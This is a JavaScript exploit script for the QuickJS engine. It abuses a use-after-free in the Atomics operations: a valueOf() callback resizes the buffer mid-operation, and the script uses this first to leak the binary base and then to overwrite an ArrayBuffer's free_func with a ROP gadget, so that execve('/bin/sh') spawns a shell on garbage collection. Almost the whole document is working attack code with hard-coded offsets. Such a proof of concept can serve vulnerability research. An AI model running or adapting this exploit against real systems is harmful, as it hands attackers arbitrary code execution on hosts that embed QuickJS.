// QuickJS Atomics UAF Exploit - Shell Execution (Full RELRO)
//
// Vulnerability: Heap buffer overflow/UAF in js_atomics_op()
// The Atomics operations capture a pointer to the TypedArray's buffer
// BEFORE calling valueOf() on the operand. If valueOf() resizes the
// ArrayBuffer, the old data region is freed and potentially reused.
// The atomic operation then reads/writes to the stale (freed) pointer.
//
// Exploitation Strategy:
// 1. Leak binary base by reading free_func from a JSArrayBuffer struct
//    that lands in the freed memory region
// 2. Corrupt the free_func field of a JSArrayBuffer with a gadget address
// 3. The gadget sets rdi to point to our controlled data+0x20 and
//    calls the address stored at data[0]
// 4. Pre-fill the victim's data buffer with execve@plt at offset 0 and
//    "/bin/sh" at offset 0x20
// 5. When GC frees the corrupted JSArrayBuffer, execve("/bin/sh", ...) is called

function toHex(n) {
    let val = n < 0n ? n + BigInt("0x10000000000000000") : n;
    return "0x" + val.toString(16).padStart(16, '0');
}

// Binary offsets (from analysis)
const FREE_FUNC_OFFSET = BigInt(0x14bc0);     // js_array_buffer_free
const GADGET_OFFSET = BigInt(0x36736);         // lea rdi, [rdx+0x20]; call [rdx]
const EXECVE_PLT_OFFSET = BigInt(0x11410);     // execve@plt

// =====================================================================
// STEP 1: Leak binary base via UAF read of free_func
// =====================================================================

let binaryBase = null;

{
    // Create a 56-byte resizable ArrayBuffer
    // This size matches the JSArrayBuffer struct size for optimal overlap
    let ab = new ArrayBuffer(56, { maxByteLength: 65536 });
    let view = new BigInt64Array(ab);

    // Fill with marker pattern (will be overwritten)
    for (let i = 0; i < view.length; i++) {
        view[i] = 0x4141414141414141n;
    }

    let allocs = [];

    // Atomics.add reads the old value before adding
    // valueOf is called to convert the operand to BigInt64
    // During valueOf, we resize the buffer, freeing the old data region
    // New ArrayBuffer allocations land in the freed space
    // The atomic read then accesses the stale pointer (now JSArrayBuffer struct)
    let result = Atomics.add(view, 6, {  // Index 6 = offset 48 = free_func field
        valueOf: function() {
            ab.resize(32768);  // Free old 56-byte region

            // Allocate ArrayBuffers - their JSArrayBuffer structs may land
            // in the freed region
            for (let j = 0; j < 50; j++) {
                allocs.push(new ArrayBuffer(8));
            }

            return 0n;  // Return value is added to the read value
        }
    });

    // Convert to unsigned BigInt
    let val = result < 0n ? result + BigInt("0x10000000000000000") : result;

    // Verify by checking low 12 bits match js_array_buffer_free offset
    if ((Number(val) & 0xFFF) === 0xbc0) {
        binaryBase = val - FREE_FUNC_OFFSET;
    }
}

if (!binaryBase) {
    throw "Failed to leak binary base";
}

// Calculate gadget and execve@plt addresses
let gadgetAddr = binaryBase + GADGET_OFFSET;
let execvePlt = binaryBase + EXECVE_PLT_OFFSET;

// =====================================================================
// STEP 2: Corrupt free_func with gadget, set up payload in victim data
// =====================================================================

// Create trigger buffer (56 bytes to match JSArrayBuffer struct size)
let trigger = new ArrayBuffer(56, { maxByteLength: 65536 });
let triggerView = new BigInt64Array(trigger);

// Initialize (these values will be overwritten by JSArrayBuffer struct)
for (let i = 0; i < triggerView.length; i++) {
    triggerView[i] = 0n;
}

let victims = [];

// Write gadget address to offset 48 (free_func field)
Atomics.store(triggerView, 6, {
    valueOf: function() {
        trigger.resize(32768);  // Free the 56-byte data region

        // Allocate 64-byte victims
        // Their JSArrayBuffer structs may land in the freed region
        // Their DATA buffers (64 bytes each) contain our payload
        for (let j = 0; j < 50; j++) {
            let v = new ArrayBuffer(64);  // 64 bytes of data
            let vView = new BigInt64Array(v);
            let vDV = new DataView(v);

            // Fill victim's data buffer with payload:
            // [0] = execve@plt (called by "call [rdx]")
            // [0x20] = "/bin/sh\0" (loaded into rdi by "lea rdi, [rdx+0x20]")
            vView[0] = execvePlt;
            vView[1] = 0n;  // NULL for argv[0]
            vView[2] = 0n;
            vView[3] = 0n;

            let cmd = "/bin/sh";
            for (let k = 0; k < cmd.length; k++) {
                vDV.setUint8(0x20 + k, cmd.charCodeAt(k));
            }
            vDV.setUint8(0x20 + cmd.length, 0);

            victims.push(v);
        }

        return gadgetAddr;  // Written to offset 48 (free_func)
    }
});

// =====================================================================
// STEP 3: Trigger GC - script exit will free corrupted buffer
// =====================================================================
// When the corrupted JSArrayBuffer is freed:
// - free_func = gadget (lea rdi, [rdx+0x20]; call [rdx])
// - data = pointer to victim's 64-byte buffer (contains payload)
// - opaque = 0 (will become rsi)
//
// The gadget executes:
// 1. lea rdi, [rdx+0x20]  -> rdi = &"/bin/sh"
// 2. call [rdx]           -> call execve@plt
//
// Result: execve("/bin/sh", ???, ???) spawns a shell
